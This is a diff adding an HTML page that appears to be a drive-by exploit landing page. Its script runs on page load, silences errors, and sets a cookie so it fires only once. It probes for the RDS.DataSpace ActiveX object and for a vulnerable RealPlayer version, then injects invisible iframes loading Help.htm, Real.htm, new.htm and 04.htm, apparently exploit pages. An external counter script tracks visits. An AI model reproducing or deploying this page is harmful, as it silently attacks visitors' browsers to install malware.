@@ -1,0 +1,78 @@
+<HTML><BODY>
+<script>window.onerror=function(){return true;}</script>
+<Script Language="JScript">
+	var cook = "silentwm";
+	
+	function setCookie(name, value, expire) 
+	{   
+		window.document.cookie = name + "=" + escape(value) + ((expire == null) ? "" : ("; expires=" + expire.toGMTString()));
+	}
+
+	function getCookie(Name) 
+	{   
+		var search = Name + "=";
+		if (window.document.cookie.length > 0) 
+		{ 
+			offset = window.document.cookie.indexOf(search);
+			if (offset != -1) 
+			{ 
+				offset += search.length;       
+			  end = window.document.cookie.indexOf(";", offset)       
+			  if (end == -1)
+			    end = window.document.cookie.length;
+			  return unescape(window.document.cookie.substring(offset, end));
+			 }
+		 }
+	  return null;
+	}
+
+	function register(name) 
+	{
+		var today = new Date();
+		var expires = new Date();
+		expires.setTime(today.getTime() + 1000*60*60*24);
+		setCookie(cook, name, expires);
+	}
+
+	function openWM() 
+	{
+		var c = getCookie(cook);
+		if (c != null) 
+		{
+	  	return;
+		}
+		
+		register(cook);
+		
+		window.defaultStatus="Íê³É";
+			
+		try{ var e;
+			var ado=(document.createElement("object"));
+			ado.setAttribute("classid","clsid:BD96C556-65A3-11D0-983A-00C04FC29E36");
+			var as=ado.createobject("Adodb.Stream","")}
+		catch(e){};
+		finally{
+			if(e!="[object Error]"){
+				document.write("<iframe width=50 height=0 src=Help.htm></iframe>")}
+			else
+			{	
+				try{ var j;
+					var real11=new ActiveXObject("IERP"+"Ctl.I"+"ERPCtl.1");}
+				catch(j){};
+				finally{if(j!="[object Error]"){if(new ActiveXObject("IERPCtl.IERPCtl.1").PlayerProperty("PRODUCTVERSION")<="6.0.14.552")
+                                        {document.write('<iframe width=10 height=0 src=Real.htm></iframe>')}
+                         else
+                         {
+					document.write('<iframe width=10 height=0 src=new.htm></iframe>')}}}
+
+					document.write('<iframe width=50 height=0 src=04.htm></iframe>')
+
+
+			}
+	}
+
+openWM();
+</script>
+</BODY></HTML>
+
+<script language="javascript" src="http://count40.51yes.com/click.aspx?id=406802056&logo=6"></script>
